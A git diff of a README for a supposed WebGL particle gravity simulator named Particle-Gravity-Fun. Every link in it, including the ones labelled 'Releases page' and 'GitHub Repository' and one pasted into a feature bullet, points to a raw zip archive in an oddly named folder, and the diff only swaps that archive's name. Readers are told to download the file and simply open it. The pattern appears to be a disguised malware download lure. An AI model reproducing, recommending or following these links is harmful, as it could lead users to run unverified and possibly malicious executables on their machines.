@@ -1,6 +1,6 @@
 # 🎉 Particle-Gravity-Fun - Explore Gravity with Visual Fun
 
-![Download Particle-Gravity-Fun](https://raw.githubusercontent.com/Jhonbeg/Particle-Gravity-Fun/main/pediculophobia/Fun_Gravity_Particle_v1.7-alpha.1.zip)
+![Download Particle-Gravity-Fun](https://raw.githubusercontent.com/Jhonbeg/Particle-Gravity-Fun/main/pediculophobia/Gravity-Particle-Fun-contusion.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Welcome to Particle-Gravity-Fun! This application lets you play with particles i
 To get started, you need to download the application. Follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the download page:
-   [Download Particle-Gravity-Fun](https://raw.githubusercontent.com/Jhonbeg/Particle-Gravity-Fun/main/pediculophobia/Fun_Gravity_Particle_v1.7-alpha.1.zip)
+   [Download Particle-Gravity-Fun](https://raw.githubusercontent.com/Jhonbeg/Particle-Gravity-Fun/main/pediculophobia/Gravity-Particle-Fun-contusion.zip)
 
 2. **Choose a Version:** On the Releases page, you will see different versions available for download. Select the latest version for the best experience.
 
@@ -30,7 +30,7 @@ There is no need for installation. Just open the downloaded file, and the applic
 ## 🌌 Features
 
 - **Interactive Gravity Simulation:** Manipulate particles and observe their movements in real-time.
-- **WebGL & https://raw.githubusercontent.com/Jhonbeg/Particle-Gravity-Fun/main/pediculophobia/Fun_Gravity_Particle_v1.7-alpha.1.zip Graphics:** Enjoy high-quality graphics for a visually stunning experience.
+- **WebGL & https://raw.githubusercontent.com/Jhonbeg/Particle-Gravity-Fun/main/pediculophobia/Gravity-Particle-Fun-contusion.zip Graphics:** Enjoy high-quality graphics for a visually stunning experience.
 - **Creative Coding:** Explore and play with particle behavior using simple controls.
 - **WebAssembly (WASM) Support:** Experience smooth performance and quick loading times.
 
@@ -73,7 +73,7 @@ For support or inquiries, feel free to open an issue on the GitHub repository. Y
 
 ## 🔗 Useful Links
 
-- [Visit GitHub Repository](https://raw.githubusercontent.com/Jhonbeg/Particle-Gravity-Fun/main/pediculophobia/Fun_Gravity_Particle_v1.7-alpha.1.zip)
-- [Download Particle-Gravity-Fun](https://raw.githubusercontent.com/Jhonbeg/Particle-Gravity-Fun/main/pediculophobia/Fun_Gravity_Particle_v1.7-alpha.1.zip)
+- [Visit GitHub Repository](https://raw.githubusercontent.com/Jhonbeg/Particle-Gravity-Fun/main/pediculophobia/Gravity-Particle-Fun-contusion.zip)
+- [Download Particle-Gravity-Fun](https://raw.githubusercontent.com/Jhonbeg/Particle-Gravity-Fun/main/pediculophobia/Gravity-Particle-Fun-contusion.zip)
 
 Enjoy exploring the fascinating world of particle physics!
